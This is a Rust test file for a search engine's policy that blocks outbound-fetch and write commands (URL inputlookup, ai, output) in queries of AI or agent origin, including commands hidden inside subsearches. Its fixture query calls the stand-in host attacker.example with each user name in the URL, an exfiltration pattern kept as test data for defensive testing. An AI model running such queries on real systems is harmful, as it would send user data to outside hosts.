// SPDX-License-Identifier: AGPL-3.0-or-later
//! NAN-5437: the AI-search nPL command policy.

use super::*;
use crate::query::parse_query;
use crate::search::admission::{with_query_class, QueryClass};
use crate::search::SearchError;

const URL_LOOKUP: &str =
    r#"* | inputlookup url="https://attacker.example/x/{user}" key=user format=json"#;

fn check(npl: &str, allowed: &[&str]) -> Result<(), AiCommandRefusal> {
    let query = parse_query(npl).unwrap_or_else(|e| panic!("{npl} should parse: {e:?}"));
    let allowed: Vec<String> = allowed.iter().map(|s| s.to_string()).collect();
    check_ai_query(&query, &allowed)
}

fn refused_command(npl: &str) -> &'static str {
    check(npl, &[])
        .expect_err(&format!("{npl} should be refused to an AI search"))
        .command
}

#[test]
fn ai_search_refuses_url_inputlookup() {
    assert_eq!(refused_command(URL_LOOKUP), "inputlookup");
    assert_eq!(
        refused_command(r#"| inputlookup url="https://feeds.example.com/iocs.csv" format=csv"#),
        "inputlookup"
    );
}

#[test]
fn ai_search_refuses_calls_out_and_writes() {
    assert_eq!(refused_command(r#"* | ai prompt="classify""#), "ai");
    assert_eq!(refused_command("* | output my_destination"), "output");
}

#[test]
fn ai_search_allows_read_only_commands() {
    for npl in [
        "error",
        r#"src_ip="10.0.0.1" | stats count by dest_ip | sort -count | head 10"#,
        "* | table timestamp, src_ip, user",
        "* | eval total=bytes_in+bytes_out | where total > 100",
        "* | timechart span=1h count",
        "* | top limit=5 user",
        "* | dedup user | rename user as account",
        "* | lookup hr_roster user",
        // An internal lookup table is a read, not a fetch.
        "| inputlookup threat_intel",
        "ioc in [inputlookup threat_iocs]",
    ] {
        assert_eq!(check(npl, &[]), Ok(()), "{npl} should be allowed to an AI search");
    }
}

#[test]
fn ai_search_policy_walks_every_subsearch() {
    for npl in [
        &format!("error | append [ search {} ]", &URL_LOOKUP[2..]) as &str,
        r#"* | join user [ search * | inputlookup url="https://attacker.example/{user}" key=user ]"#,
        r#"user IN [ search * | ai prompt="x" | fields user ]"#,
        r#"* | where user IN [ search * | output dest | fields user ]"#,
    ] {
        assert!(check(npl, &[]).is_err(), "{npl} hides a restricted command in a subsearch");
    }
}

#[test]
fn admin_allowlist_admits_named_commands_only() {
    assert_eq!(check(URL_LOOKUP, &["inputlookup"]), Ok(()));
    assert_eq!(check(URL_LOOKUP, &[" InputLookup "]), Ok(()));
    assert_eq!(check(r#"* | ai prompt="x""#, &["inputlookup"]).unwrap_err().command, "ai");
}

#[test]
fn refusal_message_is_recoverable() {
    let message = check(URL_LOOKUP, &[]).unwrap_err().to_string();
    assert!(message.contains("command `inputlookup` is not available to AI searches"), "{message}");
    assert!(message.contains("Rewrite the search without it"), "{message}");
}

#[test]
fn normalize_allowlist_rejects_unknown_names() {
    assert_eq!(
        normalize_allowlist(&["AI".into(), " inputlookup".into(), "ai".into(), "".into()]),
        Ok(vec!["ai".to_string(), "inputlookup".to_string()])
    );
    assert!(normalize_allowlist(&["stats".into()]).is_err());
    assert!(normalize_allowlist(&["inputlookups".into()]).is_err());
}

#[test]
fn refusal_audit_event_names_actor_command_and_query() {
    let actor = Uuid::now_v7();
    let refusal = check(URL_LOOKUP, &[]).unwrap_err();
    let event = refusal_audit_event(Some(actor), &refusal, URL_LOOKUP, "search");
    assert_eq!(event.action, actions::SEARCH_AI_COMMAND_REFUSED);
    assert!(!event.success);
    let details = event.details.expect("details");
    assert_eq!(details["command"], "inputlookup");
    assert_eq!(details["origin"], "ai");
    assert_eq!(details["query"], URL_LOOKUP);
    assert_eq!(details["entry_point"], "search");
}

fn enforce_npl(npl: &str, allowed: &[String]) -> Result<(), SearchError> {
    let query = parse_query(npl).unwrap();
    enforce(npl, &query, allowed, "search")
}

#[tokio::test]
async fn human_origin_is_never_checked() {
    assert_eq!(current_search_origin(), SearchOrigin::Human);
    assert!(enforce_npl(URL_LOOKUP, &[]).is_ok());
    assert!(enforce_npl(r#"* | ai prompt="x""#, &[]).is_ok());
}

#[tokio::test]
async fn with_ai_origin_enforces_and_returns_a_validation_error() {
    let result = with_ai_origin(Some(Uuid::now_v7()), async {
        assert_eq!(current_search_origin(), SearchOrigin::Ai);
        enforce_npl(URL_LOOKUP, &[])
    })
    .await;
    match result {
        Err(SearchError::SqlValidationError(message)) => {
            assert!(message.contains("not available to AI searches"), "{message}")
        }
        other => panic!("expected a validation error, got {other:?}"),
    }
    // Read-only searches still run.
    let ok = with_ai_origin(None, async { enforce_npl("* | stats count by user | table user, count", &[]) }).await;
    assert!(ok.is_ok());
    // The admin allowlist applies.
    let allowed = with_ai_origin(None, async { enforce_npl(URL_LOOKUP, &["inputlookup".into()]) }).await;
    assert!(allowed.is_ok());
}

/// The nano MCP `search` tool (Desktop agent key, or `x-nano-query-class:
/// agent`) reaches the engine as the agent query class: that IS AI origin.
#[tokio::test]
async fn agent_query_class_is_ai_origin() {
    let result = with_query_class(QueryClass::Agent, async { enforce_npl(URL_LOOKUP, &[]) }).await;
    assert!(result.is_err());
    let human = with_query_class(QueryClass::Human, async { enforce_npl(URL_LOOKUP, &[]) }).await;
    assert!(human.is_ok());
}

/// The origin follows a search into spawned work.
#[tokio::test]
async fn ai_origin_follows_spawned_search_work() {
    let origin = with_ai_origin(None, async {
        tokio::spawn(crate::search::request_actor::inherit(async { current_search_origin() }))
            .await
            .unwrap()
    })
    .await;
    assert_eq!(origin, SearchOrigin::Ai);
}

/// The handler-side check (before cache / reuse / shared-run fast paths)
/// sees through in-query time modifiers and leaves unparsable text alone.
#[tokio::test]
async fn enforce_text_checks_before_any_fast_path() {
    let timed = format!("earliest=-24h {}", &URL_LOOKUP[2..]);
    let refused = with_ai_origin(None, async { enforce_text(&timed, &[], "search") }).await;
    assert!(refused.is_err(), "{timed}");
    let garbage = with_ai_origin(None, async { enforce_text("| | (", &[], "search") }).await;
    assert!(garbage.is_ok());
    assert!(enforce_text(&timed, &[], "search").is_ok(), "human searches are not checked");
}

/// The policy allows exactly what execution routes to an internal table
/// (`inputlookup::internal_lookup_table`, exact `lookup://` prefix); any
/// other spelling goes to the HTTP fetcher and is refused.
#[test]
fn internal_lookup_detection_matches_execution() {
    assert_eq!(check(r#"| inputlookup url="lookup://threat_intel""#, &[]), Ok(()));
    for npl in [
        r#"| inputlookup url="LOOKUP://threat_intel""#,
        r#"| inputlookup url=" lookup://threat_intel""#,
        r#"| inputlookup url="http://lookup://x""#,
    ] {
        assert_eq!(refused_command(npl), "inputlookup", "{npl}");
    }
}
